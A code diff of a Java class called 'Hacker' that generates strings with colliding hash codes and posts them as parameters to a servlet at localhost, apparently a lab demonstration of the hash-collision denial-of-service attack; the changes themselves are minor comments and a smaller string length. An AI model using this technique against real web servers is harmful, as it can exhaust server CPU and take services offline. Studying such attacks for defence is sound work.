@@ -11,6 +11,7 @@ import java.util.List;
 public class Hacker {
 
     private static final String[] basestring = new String[4];
+    // used the
     static {
         basestring[0] = "q~";
         basestring[1] = "r_";
@@ -21,7 +22,7 @@ public class Hacker {
     public static void main(String[] args) throws Exception {
         // will produce 4^stringlength collisons. so 10 will produce 1'048'576
         // collisions
-        int stringlength = 8;
+        int stringlength = 7;
         URL server = new URL(
                 "http://localhost:8080/HashCollisionWeb/HashCollisionServlet");
 
@@ -37,6 +38,7 @@ public class Hacker {
                 conn.getOutputStream());
         writer.write(parameter);
         for (String s : collisions) {
+            // "=1" is optional to write
             writer.write(s + "=1&");
         }
         writer.flush();
@@ -49,6 +51,9 @@ public class Hacker {
         conn.disconnect();
     }
 
+    /**
+     * taken from stackoverflow and modified a little bit.
+     */
     private static final List<String> generateCombinations(int arraySize,
             String[] possibleValues) {
         // use an itertive method and not a recursive one since it uses too much
@@ -70,10 +75,8 @@ public class Hacker {
                 if (carry == 0) {
                     break;
                 }
-
                 indices[i] += carry;
                 carry = 0;
-
                 if (indices[i] == possibleValues.length) {
                     carry = 1;
                     indices[i] = 0;
